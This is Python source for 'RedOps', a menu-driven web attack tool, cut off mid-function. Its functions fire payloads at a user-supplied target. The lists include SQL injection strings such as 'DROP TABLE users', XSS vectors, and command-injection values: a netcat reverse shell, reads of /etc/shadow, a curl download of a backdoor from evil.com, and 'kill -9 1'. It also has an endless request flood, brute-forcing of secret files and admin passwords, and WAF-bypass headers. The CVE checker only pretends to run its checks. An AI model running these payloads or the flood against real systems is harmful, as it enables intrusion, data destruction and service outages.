import aiohttp
import asyncio
import socket
import ssl
from urllib.parse import urljoin, urlparse
import os
import dns.resolver
import dns.query
import dns.zone
from concurrent.futures import ThreadPoolExecutor

os.makedirs("output", exist_ok=True)

def display_banner():
    print("\033[1;34m")
    print("""
 ______              _____             
(_____ \            / ___ \            
 _____) ) ____  ___| |   | |____   ___ 
(_____ ( / _  )/___) |   | |  _ \ /___)
      | ( (/ /|___ | |___| | | | |___ |
      |_|\____|___/ \_____/| ||_/(___/ 
                           |_|         

 Author: kdandy | Repo: https://github.com/kdandy/RedOps
 Basic Pentesting Tools
    """)
    print("\033[1;m")

display_banner()

def display_menu():
    print("\n\033[1;34mSelect the features you want to run:\033[1;m")
    print("\033[1;34m1.\033[1;m Search for subdomains")
    print("\033[1;34m2.\033[1;m Spam GET requests to target URL")
    print("\033[1;34m3.\033[1;m Full Port Scan")
    print("\033[1;34m4.\033[1;m Directory and Sensitive File Bruteforcing")
    print("\033[1;34m5.\033[1;m SQL Injection Testing")
    print("\033[1;34m6.\033[1;m XSS Testing")
    print("\033[1;34m7.\033[1;m Header and SSL/TLS Inspection")
    print("\033[1;34m8.\033[1;m CSRF Testing")
    print("\033[1;34m9.\033[1;m Reverse DNS Lookup")
    print("\033[1;34m10.\033[1;m DNS Zone Transfer Testing")
    print("\033[1;34m11.\033[1;m Open Redirect Testing")
    print("\033[1;34m12.\033[1;m Command Injection Testing")
    print("\033[1;34m13.\033[1;m CVE Exploit Checker")
    print("\033[1;34m14.\033[1;m Wordlist Customization for Bruteforcing")
    print("\033[1;34m15.\033[1;m Parameter Discovery")
    print("\033[1;34m16.\033[1;m WAF Detection")
    print("\033[1;34m17.\033[1;m Rate Limiting/Throttling Test")
    print("\033[1;34m18.\033[1;m CORS Misconfiguration Testing")
    print("\033[1;34m19.\033[1;m Weak Password Detection")
    print("\033[1;34m20.\033[1;m HTTP Methods Testing")
    print("\033[1;34m21.\033[1;m API Security Testing")
    print("\033[1;34m22.\033[1;m DNS Rebinding Testing")
    print("\033[1;34m23.\033[1;m Information Disclosure Detection")
    print("\033[1;34m24.\033[1;m XML External Entity (XXE) Testing")
    print("\033[1;34m25.\033[1;m Basic Authentication Bruteforce")
    print("\033[1;34m26.\033[1;m WebSocket Security Testing")
    print("\033[1;34m27.\033[1;m Parameter Pollution Testing")
    print("\033[1;34m28.\033[1;m Exit")
    choice = input("\033[1;34mEnter options (1-28): \033[1;m")
    return choice

def url_validator(url):
    parsed = urlparse(url)
    return parsed.scheme in ('http', 'https')

async def fetch_subdomains(domain):
    print("\nPress 'b' anytime to go back to the main menu.")
    if domain.lower() == "b":
        return
    crt_sh_url = f"https://crt.sh/?q=%25.{domain}&output=json"
    print(f"Fetching subdomains for {domain}...")
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(crt_sh_url) as response:
                if response.status == 200:
                    data = await response.json()
                    subdomains = {entry['name_value'] for entry in data}
                    print("\nFound subdomains:")
                    for subdomain in subdomains:
                        print(subdomain)
                    
                    with open("output/findsub.text", "w") as file:
                        file.write("\n".join(subdomains))
                    
                    print("\nSubdomains saved to output/findsub.text")
                else:
                    print(f"Failed to access crt.sh. Status code: {response.status}")
        except Exception as e:
            print(f"Error fetching subdomains: {e}")

async def spam_get_requests(url, requests_per_batch):
    print(f"Sending spam GET requests to {url} with {requests_per_batch} requests per batch.")
    if url.lower() == "b" or str(requests_per_batch).lower() == "b":
        return
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return
    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_single_get_request(session, url) for _ in range(requests_per_batch)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0)

async def send_single_get_request(session, url):
    try:
        async with session.get(url) as response:
            print(f"Accessed {url} with status {response.status}")
    except Exception as e:
        print(f"Error accessing {url}: {e}")

async def async_port_scan(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(0)
        try:
            sock.connect((ip, port))
            print(f"Port {port} is open on {ip}")
            return port
        except:
            return None

async def full_port_scan(domain):
    print(f"Starting full port scan on {domain}")
    if domain.lower() == "b":
        return
    ip = socket.gethostbyname(domain)
    open_ports = []
    tasks = [async_port_scan(ip, port) for port in range(1, 65535)]
    open_ports = [port for port in await asyncio.gather(*tasks) if port]
    
    if open_ports:
        with open("output/open_ports.txt", "w") as file:
            file.write(f"Open ports on {domain}:\n" + "\n".join(map(str, open_ports)))
        print("\nOpen ports saved to output/open_ports.txt")
    else:
        print("\nNo open ports found.")

async def bruteforce_directories_and_sensitive_files(url):
    print(f"Starting directory and file bruteforcing on {url}")
    if url.lower() == "b":
        return
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return
    
    directories_and_files = [
        "admin", "administrator", "dashboard", "config", "configs", "conf", "backup", "backups", "upload", "uploads",
        "private", "data", "database", "db", "log", "logs", "temp", "tmp", "cache", "debug", "include", "includes",
        "lib", "libs", "modules", "cgi-bin", "public", "files", "assets", "static", "src", "source", "environment",
        "env", "staging", "test", "tests", "sample", "samples", "dev", "development", "examples", "docs", "documentation",
        ".env", ".htaccess", ".git/", ".gitignore", ".npmrc", ".bash_history", ".zsh_history", "settings.py", "config.py",
        "config.json", "config.yaml", "config.yml", "database.sql", "db.sql", "db_backup.sql", "backup.sql", "secrets.json",
        "secret.key", "private.key", "server.key", "id_rsa", "id_rsa.pub", "docker-compose.yml", "Dockerfile",
        "wp-config.php", "local_settings.py", "web.config", "application.yml", "application.yaml", "parameters.yml",
        "parameters.yaml", "composer.json", "composer.lock", "package.json", "package-lock.json", "yarn.lock",
        "Pipfile", "Pipfile.lock", "requirements.txt", "Gemfile", "Gemfile.lock", "Makefile", "Procfile", "Rakefile",
        "error.log", "access.log", "debug.log", "install.log", "system.log", "error_log", "apache.log", "nginx.log",
        "mysql_error.log", "php_error.log", "install.log", "setup.log", "database.log", "debug.log",
        "backup.zip", "backup.tar.gz", "backup.tar", "site_backup.zip", "db_backup.zip", "database_backup.zip",
        "backup.bak", "backup_old.tar.gz", "old_backup.zip", "data_backup.zip", "site-backup.tar.gz", "config_backup.tar",
        "project_backup.tar", "app_backup.tar", "backup.sql.gz", "backup.sql.zip", "backup_db.tar.gz",
        "sitemap.xml", "sitemap_index.xml", "phpinfo.php", "readme.md", "README.txt", "LICENSE", "CHANGELOG.md",
        "CHANGELOG.txt", "UPGRADE.txt", "INSTALL.txt", "VERSION", "todo.txt", "TODO.md", "notes.txt", "NOTES.md",
        "help.md", "help.txt", "CONTRIBUTING.md", "AUTHORS", "SECURITY.md", "policy.md", "robots.txt",
        "site.xml", "rss.xml", "feeds.xml", "backup.xml", "env.json", "robots.json", "api_keys.txt", "secrets.txt",
        "authorized_keys", "known_hosts", "ssh_host_rsa_key", "ssh_host_dsa_key", "tls.key", "tls.crt", "cert.pem",
        "privkey.pem", "fullchain.pem", "cacert.pem", "client-cert.pem", "ssl-cert-snakeoil.pem", "server.crt"
    ]
    
    async with aiohttp.ClientSession() as session:
        found_items = []
        for item in directories_and_files:
            test_url = urljoin(url, item)
            try:
                async with session.get(test_url) as response:
                    if response.status == 200:
                        print(f"Found: {test_url}")
                        found_items.append(test_url)
                    else:
                        print(f"No access: {test_url}")
            except Exception as e:
                print(f"Error accessing {test_url}: {e}")
        
        if found_items:
            with open("output/found_items.txt", "w") as file:
                file.write("Found directories and files:\n" + "\n".join(found_items))
            print("\nResults saved to output/found_items.txt")
        else:
            print("\nNo directories or files found.")

async def sql_injection_testing(url):
    print(f"Starting SQL injection testing on {url}")
    if url.lower() == "b":
        return
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return

    sql_payloads = [
    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1'#", "' OR 1=1--",
    "' OR 'x'='x", "' OR '1'='1' AND ''='", "'; DROP TABLE users; --", "'; SELECT SLEEP(5); --",
    "' UNION SELECT NULL, NULL, NULL --", "' UNION SELECT username, password FROM users --",
    "' UNION SELECT 1,2,3,4,5--", "' UNION SELECT ALL FROM information_schema.tables --",
    "' UNION SELECT table_name FROM information_schema.tables--", 
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
    "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b", "' AND ASCII(SUBSTRING((SELECT database()),1,1))=97 --",
    "' AND EXISTS(SELECT 1 FROM users WHERE username='admin') --", 
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
    "' OR SLEEP(5)--", "' OR IF(1=1, SLEEP(5), 0)--", "' AND IF((SELECT 'a' FROM users LIMIT 1)='a', SLEEP(5), 0) --",
    "' OR BENCHMARK(1000000,MD5(1))--", "' OR IF(EXISTS(SELECT * FROM users), SLEEP(5), 0) --",
    "' AND IF(LENGTH(database())>0,SLEEP(5),0)--", "' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64, SLEEP(5),0)--",
    "' AND 1=CONVERT(int, (SELECT @@version))--", "' OR 1=CAST((SELECT @@version) AS int)--",
    "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
    "' AND UPDATEXML(1,CONCAT(0x3a,version()),1)--", "' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT user())))--",
    "' AND IF((SELECT user())='root', SLEEP(5), 0)--", "' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)--",
    "' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin') > 5, SLEEP(5), 0)--",
    "' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) = 97, SLEEP(5), 0) --",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)--",
    "' OR EXP(~(SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))--",
    "' UNION SELECT 1, version(), 3--", "' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))abc)--"
    ]

    
    async with aiohttp.ClientSession() as session:
        for payload in sql_payloads:
            test_url = f"{url}{payload}"
            try:
                async with session.get(test_url) as response:
                    print(f"Tested SQL payload {payload} on {test_url} with status {response.status}")
                    content = await response.text()
                    if "syntax error" in content or "SQL" in content:
                        print(f"Potential SQL Injection vulnerability found with payload: {payload}")
            except Exception as e:
                print(f"Error testing SQL payload {payload}: {e}")

async def xss_testing(url):
    print(f"Starting XSS testing on {url}")
    if url.lower() == "b":
        return
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return

    xss_payloads = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>", "'\"><img src=x onerror=alert('XSS')>",
    "<script>alert(document.cookie)</script>", "<script>alert('XSS');</script>",
    "<svg onload=alert('XSS')>", "<iframe src=javascript:alert('XSS')>",
    "<video><source onerror=\"javascript:alert('XSS')\">", "<input onfocus=alert('XSS') autofocus>",
    "<img src=x onerror=alert('XSS') />", "<img src=x onerror=\"alert('XSS')\" />",
    "<a href='javascript:alert(1)'>Click</a>", "<button onclick=alert('XSS')>Click</button>",
    "<div onmouseover=alert('XSS')>Hover over me!</div>", "<input onblur=alert('XSS')>",
    "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E", "<svg%20onload=alert('XSS')>",
    "<img%20src%3Dx%20onerror%3Dalert('XSS')>", "<iframe%20src=javascript:alert('XSS')>",
    "<img src=x:alert(1) onerror=eval(src)>", "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
    "<body background=\"javascript:alert('XSS')\">", "<object data=\"javascript:alert('XSS')\">",
    "<details open ontoggle=alert('XSS')>XSS</details>", "<isindex action=javascript:alert('XSS')>",
    "<keygen autofocus onfocus=alert('XSS')>", "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<object type=\"text/html\" data=\"javascript:alert('XSS')\"></object>",
    "<a href='javascript:alert(1)'>XSS</a>", "<a href='JaVaScRiPt:alert(1)'>XSS</a>",
    "<iframe src=\"javascript:alert('XSS');\"></iframe>", "<link rel=\"stylesheet\" href=\"javascript:alert('XSS');\">",
    "<script>document.write('<img src=x onerror=alert(1)>');</script>",
    "<script>document.body.innerHTML='<img src=x onerror=alert(1)>';</script>",
    "<script>window.location='javascript:alert(1)';</script>", "<script>history.pushState('', '', 'javascript:alert(1)')</script>",
    "<div><iframe src=javascript:alert('XSS')></iframe></div>", "<table background=javascript:alert('XSS')>",
    "<img dynsrc=javascript:alert('XSS')>", "<style>*{background:url('javascript:alert(1)')}</style>",
    "<img src=1 href=1 dynsrc=javascript:alert(1)>",
    "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
    "<math><mtext></mtext><script>alert('XSS')</script></math>",
    "<xml><script><![CDATA[alert('XSS')]]></script></xml>",
    "<style>@import 'javascript:alert(1)';</style>", "<style>body{background:url(\"javascript:alert('XSS')\")}</style>",
    "<style>img[src=\"x\"]{background:url(\"javascript:alert('XSS')\")}</style>",
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>", "<scr<script>ipt>alert(1)//<scr<script>ipt>",
    "<sCrIpt>alert('XSS')</sCrIpt>", "<svg><sCrIpt>alert('XSS')</sCrIpt></svg>",
    "{\"data\":\"<img src=x onerror=alert(1)>\"}", "<script>const x=\"<img src=x onerror=alert(1)>\";</script>"
    ]
    
    async with aiohttp.ClientSession() as session:
        for payload in xss_payloads:
            test_url = f"{url}?q={payload}"
            try:
                async with session.get(test_url) as response:
                    print(f"Tested XSS payload {payload} on {test_url} with status {response.status}")
                    content = await response.text()
                    if payload in content:
                        print(f"Potential XSS vulnerability found with payload: {payload}")
            except Exception as e:
                print(f"Error testing XSS payload {payload}: {e}")

async def inspect_headers_and_ssl(domain):
    print(f"Starting header and SSL/TLS inspection on {domain}")
    if domain.lower() == "b":
        return
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"https://{domain}") as response:
                print("\nHTTP Headers:")
                for header, value in response.headers.items():
                    print(f"{header}: {value}")
        except Exception as e:
            print(f"Error fetching headers: {e}")
    
    context = ssl.create_default_context()
    with socket.create_connection((domain, 443)) as sock:
        with context.wrap_socket(sock, server_hostname=domain) as ssock:
            cert = ssock.getpeercert()
            print("\nSSL Certificate Information:")
            for key, value in cert.items():
                print(f"{key}: {value}")

async def csrf_testing(url):
    print(f"Starting CSRF testing on {url}")
    if url.lower() == "b":
        return

    csrf_payloads = [
        {"username": "csrf_test", "password": "csrf_test"},
        {"user": "admin", "pass": "password123"},
        {"username": "admin", "password": "password", "csrf_token": ""},
        {"email": "test@example.com", "password": "12345", "remember": "1"},
        {"user_id": "1", "amount": "1000", "transfer": "send"},
        {"username": "root", "password": "toor"},
        {"username": "administrator", "password": "admin1234"},
        {"name": "csrf_attempt", "token": ""},
        {"account": "guest", "login": "true", "csrf": "null"},
        {"username": "user", "session": "abc123", "auth_token": ""},
        {"user_email": "user@example.com", "confirm": "yes", "csrf_token": ""},
        {"userid": "admin", "otp": "0000"},
        {"action": "delete_account", "confirm": "1", "csrf_token": ""},
        {"transfer_to": "2", "amount": "5000", "auth": ""},
        {"username": "superuser", "password": "supersecure", "remember_me": "1"},
        {"login": "yes", "auth_token": "12345abc", "user_id": "99"},
        {"reset_password": "true", "email": "reset@example.com", "csrf": ""},
        {"username": "testuser", "old_password": "oldpass", "new_password": "newpass", "csrf_token": ""},
        {"action": "disable_account", "confirm": "yes", "token": ""},
        {"login_as": "guest", "temporary_access": "true"},
        {"email": "csrf_user@example.com", "request_code": "true", "csrf_protection": ""},
        {"modify": "settings", "privacy": "off", "auth_key": ""},
        {"account_id": "123", "debit": "100", "submit": "confirm"},
        {"service": "premium", "activate": "yes", "csrf_token": ""},
    ]


    
    async with aiohttp.ClientSession() as session:
        for payload in csrf_payloads:
            try:
                async with session.post(url, data=payload) as response:
                    print(f"CSRF payload {payload} on {url} status {response.status}")
            except Exception as e:
                print(f"Error testing CSRF payload {payload}: {e}")

async def reverse_dns_lookup(ip):
    print(f"Starting reverse DNS lookup for {ip}")
    try:
        hostnames = socket.gethostbyaddr(ip)
        print(f"Hostnames associated with {ip}: {hostnames}")
    except Exception as e:
        print(f"Error in reverse DNS lookup for {ip}: {e}")

async def dns_zone_transfer(domain):
    print(f"Attempting DNS zone transfer for {domain}")
    try:
        ns_records = dns.resolver.resolve(domain, 'NS')
        for ns in ns_records:
            ns = str(ns).strip('.')
            try:
                zone = dns.query.xfr(ns, domain)
                z = dns.zone.from_xfr(zone)
                print(f"Zone Transfer succeeded for {domain} using NS {ns}")
                for name, node in z.nodes.items():
                    print(f"Found DNS entry: {name}")
                return
            except Exception as e:
                print(f"Failed zone transfer for NS {ns}: {e}")
    except Exception as e:
        print(f"DNS zone transfer attempt failed: {e}")

async def open_redirect_testing(url):
    print(f"Starting Open Redirect testing on {url}")
    payloads = [
    "/redirect?url=http://evil.com", "/out?link=http://evil.com",
    "/go?to=http://evil.com", "/forward?target=http://evil.com",
    "/next?u=http://evil.com", "/?return=http://evil.com",
    "/click?redirect=http://evil.com", "/image?url=http://evil.com",
    "/login?continue=http://evil.com", "/auth?redir=http://evil.com",
    "/validate?url=http://evil.com", "/view?src=http://evil.com",
    "/outbound?dest=http://evil.com", "/forwarding?to=http://evil.com",
    "/jump?destination=http://evil.com", "/link?next=http://evil.com",
    "/track?go=http://evil.com", "/site?visit=http://evil.com",
    "/load?uri=http://evil.com", "/transfer?url=http://evil.com",
    "/action?redirect_uri=http://evil.com", "/confirm?url=http://evil.com",
    "/api?ref=http://evil.com", "/portal?url=http://evil.com",
    "/redir?path=http://evil.com"
    ]
    
    async with aiohttp.ClientSession() as session:
        for payload in payloads:
            test_url = urljoin(url, payload)
            try:
                async with session.get(test_url, allow_redirects=True) as response:
                    if "evil.com" in str(response.url):
                        print(f"Potential Open Redirect found: {test_url} redirected to {response.url}")
            except Exception as e:
                print(f"Error testing Open Redirect payload {payload}: {e}")

async def command_injection_testing(url):
    print(f"Starting Command Injection testing on {url}")
    payloads = [
    "; ls", "| whoami", "&& uname -a", "`id`", "$(cat /etc/passwd)",
    "| nc -e /bin/bash 10.10.10.10 4444", "&& curl http://evil.com",
    "`nc -nv 192.168.1.1 4444`", "$(wget http://malicious-site.com)",
    "| sleep 10", "; cat /etc/shadow", "&& touch /tmp/pwned",
    "| ping -c 10 192.168.1.1", "; curl -o /tmp/backdoor http://evil.com/backdoor",
    "| echo hacked > /tmp/hacked.txt", "`/bin/sh -i`", "| ps aux", "; kill -9 1",
    "`curl http://attack-server`", "| echo Exploited > /var/tmp/pwned",
    "&& mv /bin/bash /bin/shadow-backup", "`echo owned`", "| tee /etc/issue"
    ]
    async with aiohttp.ClientSession() as session:
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                async with session.get(test_url) as response:
                    print(f"Tested payload: {payload}, Status: {response.status}")
                    content = await response.text()
                    if "root" in content or "uid=" in content:
                        print(f"Potential Command Injection vulnerability with payload: {payload}")
            except Exception as e:
                print(f"Error testing payload {payload}: {e}")

async def cve_exploit_checker(domain):
    print(f"Checking CVEs for {domain}")
    cve_list = [
    "CVE-2021-44228",
    "CVE-2022-22965",
    "CVE-2017-5638",
    "CVE-2018-7600",
    "CVE-2019-19781",
    "CVE-2019-0708",
    "CVE-2020-1472",
    "CVE-2018-11776",
    "CVE-2021-34527",
    "CVE-2018-13379",
    "CVE-2020-0796",
    "CVE-2019-11510",
    "CVE-2017-11882",
    "CVE-2020-5902",
    "CVE-2019-18935",
    "CVE-2018-1002105",
    "CVE-2022-1388",
    ]

    for cve in cve_list:
        print(f"Checking {cve}...")
        # Simulate a check; integrate CVE vulnerability databases or APIs here
        print(f"{cve} check completed. (Implement real checks as needed)")
        
async def wordlist_customization_bruteforce(url):
    print(f"Starting directory and file bruteforcing on {url}")
    
async def wordlist_customization_bruteforce(url):
    print(f"Starting directory and file bruteforcing on {url}")
    
    items = [
        "admin", "config", "backup", "login", "dashboard", "private", "uploads", "images",
        "js", "css", "assets", "files", "data", "database", "api", "secure", "secret",
        "tmp", "logs", "error", "test", "old", "new", "dev", "staging", "docs", "download",
        "public", "internal", "include", "includes", "lib", "libs", "cgi-bin", "static",
        "wordpress", "wp-admin", "wp-content", "wp-includes", "joomla", "drupal", "magento",
        "node_modules", "vendor", "laravel", "symfony", "django", "rails", "core", "modules",
        ".env", "environment", ".git", ".svn", ".htaccess", ".htpasswd", ".DS_Store", "composer.lock",
        "composer.json", "package.json", "yarn.lock", "package-lock.json", "README.md", "LICENSE",
        "backup.sql", "db_backup", "database.sql", "dump", "old_backup", "user_backup",
        "database_backup", "backup_old", "bak", "backups", "export", "import",
        "debug.log", "error.log", "access.log", "info.log", "system.log", "log", "logs", "temp",
        "tmp", "session", "cache", "sessions", "errors", "debug", "temp_files", "archive",
        "staging", "qa", "dev", "development", "testing", "sandbox", "demo", "mock", "samples",
        "user", "users", "members", "client", "customer", "account", "profile", "auth", "authentication",
        "register", "signup", "signin", "logout", "logout", "forgot", "forgot_password",
        "config.php", "config.json", "settings.php", "settings.json", "appsettings.json", "config.xml",
        "config.ini", "web.config", "application.config", "local.config", "default.config",
        "analytics", "statistics", "stat", "stats", "tracking", "report", "reports", "mail", "email",
        "message", "messages", "contact", "feedback", "support", "help", "faq", "terms", "policy",
        "certs", "certificates", "keys", "key", "ssl", "crypto", "hash", "csrf", "token", "auth",
        "docs", "documentation", "assets", "themes", "plugins", "extensions", "addons", "widgets",
        "sitemap", "robots.txt", "humans.txt", "crossdomain.xml", "ads.txt", "browserconfig.xml",
        "apple-touch-icon.png", "favicon.ico", "favicon.png"
    ]

    
    async with aiohttp.ClientSession() as session:
        found_items = []
        for item in items:
            test_url = urljoin(url, item)
            try:
                async with session.get(test_url) as response:
                    if response.status == 200:
                        print(f"Found: {test_url}")
                        found_items.append(test_url)
                    elif response.status == 403:
                        print(f"Forbidden (403): {test_url} (but directory likely exists)")
            except Exception as e:
                print(f"Error accessing {test_url}: {e}")
        
        if found_items:
            with open("output/bruteforce_results.txt", "w") as file:
                file.write("\n".join(found_items))
            print("\nResults saved to output/bruteforce_results.txt")
        else:
            print("\nNo accessible items found in bruteforce attempt.")

async def parameter_discovery(url):
    print(f"Starting parameter discovery on {url}")
    params = [
        "id", "page", "search", "category", "q", "query", "lang", "token", "session", "user",
        "start", "limit", "offset", "count", "size", "results", "per_page", "page_number", 
        "sort", "order", "orderby", "sortby", "direction", "asc", "desc",
        "filter", "type", "status", "state", "view", "mode", "show", "display", "format", "group",
        "userid", "username", "email", "profile_id", "account", "user_id", "member_id",
        "date", "start_date", "end_date", "timestamp", "time", "created", "modified", "updated",
        "auth", "access_token", "api_key", "csrf_token", "oauth", "sso", "key", "secret",
        "locale", "country", "lang", "language", "region", "location", "city", "state", "zip",
        "product", "product_id", "item", "item_id", "sku", "cart", "cart_id", "checkout", "quantity",
        "share", "like", "tweet", "comment", "post", "follow", "tag", "hashtag",
        "input", "name", "value", "field", "text", "message", "content", "title", "body", "description",
        "file", "file_id", "filename", "path", "dir", "directory", "folder", "upload", "download",
        "action", "submit", "confirm", "callback", "redirect", "url", "path", "referer",
        "module", "handler", "service", "api", "method", "request", "response", "version"
    ]
    async with aiohttp.ClientSession() as session:
        for param in params:
            try:
                async with session.get(f"{url}?{param}=test") as response:
                    if response.status == 200:
                        print(f"Parameter {param} appears valid at {response.url}")
            except Exception as e:
                print(f"Error with parameter {param}: {e}")

async def waf_detection(url):
    print(f"Checking for Web Application Firewall (WAF) presence on {url}")
    
    waf_headers = [
        {"User-Agent": "badbot"},
        {"User-Agent": "sqlmap"},
        {"User-Agent": "crawler"},
        {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 sqlmap"},
        {"X-Original-URL": "/"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "8.8.8.8"},
        {"X-Forwarded-For": "10.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"},
        {"X-WAF-Detection": "Test"},
        {"X-WAF-Bypass": "True"},
        {"X-WAF-Test": "bypass"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Requested-With": "XMLHttpRequest"},
        {"True-Client-IP": "127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        {"X-Cluster-Client-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"User-Agent": "Wget/1.20.3"},
        {"User-Agent": "curl/7.68.0"},
        {"User-Agent": "nmap"},
        {"User-Agent": "sqlmap/1.5.4"},
        {"User-Agent": "Mozilla/5.0 zgrab/0.x"},
        {"User-Agent": "nikto"},
        {"Referer": "https://malicious-site.com"},
        {"Origin": "https://malicious-site.com"},
        {"X-Forwarded-Proto": "https"},
        {"X-Forwarded-Host": "evil.com"},
        {"X-Host": "127.0.0.1"},
        {"X-Forwarded-Scheme": "javascript"},
        {"Forwarded": "for=127.0.0.1; proto=https"},
        {"X-HTTP-Method-Override": "DELETE"},
        {"Content-Type": "application/json; charset=UTF-7"},
        {"X-Content-Type-Options": "nosniff"},
        {"X-XSS-Protection": "0"},
        {"Cache-Control": "no-store"},
    ]
    
    async with aiohttp.ClientSession() as session:
        for headers in waf_headers:
            try:
                async with session.get(url, headers=headers) as response:
                    if response.status in [403, 406, 429]:
                        print(f"Potential WAF detected with headers: {headers}")
                        return
                    elif 'Server' in response.headers and "cloudflare" in response.headers["Server"].lower():
                        print("Cloudflare WAF detected.")
                        return
                    elif 'X-CDN' in response.headers and "incapsula" in response.headers["X-CDN"].lower():
                        print("Incapsula WAF detected.")
                        return
                    elif 'X-Sucuri-ID' in response.headers:
                        print("Sucuri WAF detected.")
                        return
            except Exception as e:
                print(f"Error during WAF detection with headers {headers}: {e}")
    print("No WAF detected.")

async def rate_limiting_test(url, requests_per_second=5):
    print(f"Testing rate limiting on {url}")
    async with aiohttp.ClientSession() as session:
        for _ in range(requests_per_second):
            try:
                async with session.get(url) as response:
                    print(f"Request status: {response.status}")
            except Exception as e:
                print(f"Error during rate limit test: {e}")
            await asyncio.sleep(1 / requests_per_second)

async def cors_misconfiguration_testing(domain):
    print(f"Checking CORS configuration for {domain}")
    headers = {"Origin": "https://malicious-site.com"}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.options(f"https://{domain}", headers=headers) as response:
                if "Access-Control-Allow-Origin" in response.headers:
                    print("Potential CORS misconfiguration detected.")
        except Exception as e:
            print(f"Error checking CORS: {e}")

async def weak_password_detection(url):
    print(f"Starting weak password detection on {url}")
    passwords = ["password", "admin123", "letmein", "password1"]
    async with aiohttp.ClientSession() as session:
        for password in passwords:
            try:
                async with session.post(url, data={'username': 'admin', 'password': password}) as response:
                    if response.status == 200:
                        print(f"Weak password found: {password}")
                        break
            except Exception as e:
                print(f"Error in weak password test: {e}")

async def http_methods_testing(url):
    print(f"Testing HTTP methods on {url}")
    methods = ["OPTIONS", "PUT", "DELETE"]
    async with aiohttp.ClientSession() as session:
        for method in methods:
            try:
                async with session.request(method, url) as response:
                    print(f"{method} method allowed, status: {response.status}")
            except Exception as e:
                print(f"Error testing {method}: {e}")

async def api_security_testing(url):
    print(f"Starting API security testing on {url}")
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    print(f"API endpoint {url} is accessible without authentication.")
        except Exception as e:
            print(f"Error testing API security: {e}")

async def dns_rebinding_testing(domain):
    print(f"Testing for DNS rebinding vulnerabilities on {domain}")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Referer": "https://malicious-site.com",
        "Origin": "https://malicious-site.com",
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "Forwarded": "for=127.0.0.1",
        "Cache-Control": "no-store, no-cache, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0",
        "X-WAF-Detection": "Test",
        "X-WAF-Bypass": "True",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-Requested-With": "XMLHttpRequest",
        "X-HTTP-Method-Override": "DELETE",
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Credentials": "true",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type, Authorization",
        "Origin": "https://malicious-site.com",
        "Content-Disposition": "form-data; name='file'; filename='test.txt'",
        "Content-Type": "multipart/form-data",
        "X-Content-Type-Options": "nosniff",
        "X-XSS-Protection": "0",
        "Content-Security-Policy": "default-src 'self'; script-src 'none';",
        "Authorization": "Bearer testtoken123",
        "X-Api-Key": "testapikey123",
        "X-Auth-Token": "testauthtoken123",
        "X-Test-Header": "test",
        "X-Powered-By": "malicious-software",
        "X-Debug-Mode": "true",
        "X-Environment": "Production",
        "X-Original-URL": "/admin",
